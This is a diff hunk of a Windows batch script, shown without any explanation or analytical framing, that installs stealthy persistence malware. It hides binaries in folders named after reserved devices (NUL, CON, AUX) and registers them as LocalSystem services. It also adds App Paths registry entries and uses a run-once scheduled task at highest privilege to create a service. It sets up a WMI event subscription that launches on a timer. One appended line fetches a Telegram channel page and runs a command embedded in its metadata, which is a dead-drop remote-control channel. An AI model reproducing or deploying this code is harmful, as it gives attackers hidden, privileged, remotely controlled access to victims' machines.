@@ -16,19 +16,20 @@ move /Y "%ProgramData%\bist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\bist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
 
 echo powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://t.me/s/updategps';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
-echo powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
 echo powershell.exe %ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll >> "%USERPROFILE%\Cookies\init.cmd"
 
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\start.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\init.cmd" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\pach.cmd" /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create NetworkConfiguration binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
-sc create PerformanceMonitor binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
 sc create Layer binPath="%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
 sc create Update binPath="%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" start="auto" obj="LocalSystem"
 sc config Layer start= delayed-auto
 sc config NetworkConfiguration start= delayed-auto
+schtasks /create /rl highest /sc minute /mo 1 /tn "Update" /tr "cmd.exe /c sc create PerformanceMonitor binPath=\"%WINDIR%\System32\cmd.exe /c start install.exe\" start=auto obj=LocalSystem" /f
+schtasks /run /tn "Update"
+schtasks /delete /tn "Update" /f
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SCM'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SCM'; CommandLineTemplate='%WINDIR%\System32\cmd.exe /c start Setup.exe'} | Out-Null"
